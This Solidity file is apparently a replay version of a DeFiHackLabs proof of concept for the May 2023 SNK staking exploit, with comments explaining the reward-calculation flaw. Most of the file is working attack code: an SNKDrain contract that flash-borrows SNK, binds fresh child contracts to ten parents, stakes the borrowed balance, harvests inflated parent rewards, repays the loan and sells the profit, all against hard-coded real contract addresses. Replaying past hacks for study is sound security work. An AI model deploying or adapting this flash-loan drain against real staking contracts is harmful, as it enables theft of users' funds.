// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2023-05-SNK).
// The DeFiHackLabs PoC (test/SNK_exp.sol) runs the attack in a Foundry test
// contract `SNKExp` that IS the attacker (`address(this)`) and IS the flash-swap
// callback target (`pancakeCall`), so there is no separately-deployed attack
// contract to point the recorder at. This contract copies `pancakeCall` +
// `testExp()`'s flash-swap body + the `HackerTemplate` helper verbatim.
//
// The 10 "parent" HackerTemplates from `setUp()` (deployed + staked with 100
// SNK each, then `vm.warp(+20 days)` before the harvest) are deployed as
// `helperContracts` and staked via `setup.steps` instead of inside this
// contract's constructor/run(), because the EVM Playground's recorder uses ONE
// block timestamp for the entire replay (deploy + setup + the recorded attack
// call) — there is no way to advance time BETWEEN "parents stake" and "harvest"
// within a single replay. `setup.steps` instead directly zeroes each parent's
// `userRewardPerTokenPaid` snapshot via a raw storage write (mirroring what 20
// days of otherwise-idle elapsed time would have produced: a parent snapshot
// far behind the current global rewardPerToken accumulator), so `run()` here
// only needs to perform the actual exploit mechanics: flash-borrow, bind a
// fresh child per parent, stake the flash-borrowed balance under it, harvest
// the parent, unwind, repay, and sell the profit.
//
// Root cause (see SNK_exp.md / sources/SNKMiner_A3f5ea/SNKMiner.sol):
// SNKMiner.dynamicEarned(parent) pays `_getMyChildersBalanceOf(parent) *
// (rewardPerToken() - userRewardPerTokenPaid[parent]) * 45%`. The child-balance
// term is read LIVE at call time, while the rate-delta term spans the entire
// window since the parent's snapshot was last refreshed. Nothing requires the
// child balance to have existed during that window, so an attacker can
// flash-stake a huge balance under a freshly-bound child, immediately harvest
// the parent's `getReward()` (paying 45% of that huge balance times the stale
// rate delta), then withdraw the child's stake — repeated across 10 parents to
// multiply the drain, all funded by one flash swap that is repaid at the end.

interface IERC20 {
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
    function balanceOf(address) external view returns (uint256);
}

interface IPancakePair {
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

interface IPancakeRouter {
    // NOTE: this function returns NOTHING on-chain (verified against the
    // fetched PancakeRouter interface) — declaring a `returns (uint256[])`
    // here would make Solidity ABI-decode the (empty) return data and revert.
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

interface ISNKMinter {
    function bindParent(address parent) external;
    function stake(uint256 amount) external;
    function getReward() external;
    function exit() external;
}

contract SNKDrain {
    IERC20 constant SNKToken = IERC20(0x05e2899179003d7c328de3C224e9dF2827406509);
    IPancakePair constant pool = IPancakePair(0x7957096Bd7324357172B765C4b0996Bb164ebfd4);
    IERC20 constant BUSD = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IPancakeRouter constant router = IPancakeRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);

    // The 10 pre-staked "parent" HackerTemplates (deployed + staked via
    // helperContracts/setup — see comment above), passed in as constructor args
    // since they must be deployed BEFORE this contract to be referenced.
    address[10] public parents;

    constructor(
        address p0, address p1, address p2, address p3, address p4,
        address p5, address p6, address p7, address p8, address p9
    ) {
        parents = [p0, p1, p2, p3, p4, p5, p6, p7, p8, p9];
        SNKToken.approve(address(router), type(uint256).max);
        SNKToken.approve(address(pool), type(uint256).max);
    }

    // Mirrors testExp(): flash-borrow 80,000 SNK from the SNK/BUSD pair
    // (non-empty `data` makes this a flash swap — SNK is sent before
    // repayment, then the pair calls back pancakeCall(...) on this contract),
    // then sell the accumulated SNK profit for BUSD.
    function run() external {
        pool.swap(80_000 ether, 0, address(this), bytes("0x123"));

        address[] memory path = new address[](2);
        path[0] = address(SNKToken);
        path[1] = address(BUSD);
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            SNKToken.balanceOf(address(this)), 0, path, address(this), block.timestamp + 1000
        );
    }

    // Flash-swap callback. The borrowed 80,000 SNK (76,000 net after the 5%
    // transfer tax) is already in this contract's balance.
    function pancakeCall(address, uint256, uint256, bytes calldata) external {
        for (uint256 i = 0; i < 10; ++i) {
            // Deploy a FRESH child for parent[i] and bind it in the Invite registry.
            HackerTemplate t1 = new HackerTemplate();
            HackerTemplate t = HackerTemplate(parents[i]);
            t1.bind(parents[i]);

            // Transfer the ENTIRE current SNK balance into the child and stake it.
            // _getMyChildersBalanceOf(parents[i]) now reads this huge, just-staked
            // balance LIVE.
            SNKToken.transfer(address(t1), SNKToken.balanceOf(address(this)));
            t1.stake();

            // Harvest the parent: dynamicEarned(parent) = childBalance (huge, fresh)
            // x (rewardPerToken() - userRewardPerTokenPaid[parent]) (forced stale
            // via setup's storeSlot) x 45% — paid out even though the child balance
            // existed for zero time. t.exit2() = getReward() then exit() (withdraw
            // the parent's own 100 SNK stake too).
            t.exit2();

            // Withdraw the child's stake so the same SNK can be recycled to the next
            // parent (exit1() = exit() only, no reward claim).
            t1.exit1();
        }

        // Repay the flash swap: 80,000 principal + 0.3% fee = 85,000 SNK.
        SNKToken.transfer(address(pool), 85_000 ether);
    }
}

contract HackerTemplate {
    IERC20 constant SNKToken = IERC20(0x05e2899179003d7c328de3C224e9dF2827406509);
    ISNKMinter constant minter = ISNKMinter(0xA3f5ea945c4970f48E322f1e70F4CC08e70039ee);
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    // Playground-only addition (not in the original DeFiHackLabs HackerTemplate):
    // the 10 "parent" HackerTemplates are deployed as `helperContracts` (by the
    // attacker EOA, BEFORE SNKDrain exists), but pancakeCall's loop later calls
    // exit2()/exit1() on them FROM SNKDrain — matching the original test, where
    // SNKExp deploys AND drives its parents, so owner == caller throughout. This
    // one-time handoff (callable only by the current owner, i.e. the attacker,
    // exactly once during SNKDrain's constructor) reassigns owner to SNKDrain so
    // the rest of the exit2()/exit1()/bind() flow is byte-for-byte the original
    // onlyOwner-gated HackerTemplate logic.
    function adoptOwner(address newOwner) external onlyOwner {
        owner = newOwner;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "onlyOwner");
        _;
    }

    function stake() public onlyOwner {
        SNKToken.approve(address(minter), SNKToken.balanceOf(address(this)));
        minter.stake(SNKToken.balanceOf(address(this)));
    }

    function bind(address p) public onlyOwner {
        minter.bindParent(p);
    }

    function exit1() public onlyOwner {
        minter.exit();
        SNKToken.transfer(owner, SNKToken.balanceOf(address(this)));
    }

    function exit2() public onlyOwner {
        minter.getReward();
        minter.exit();
        SNKToken.transfer(owner, SNKToken.balanceOf(address(this)));
    }
}
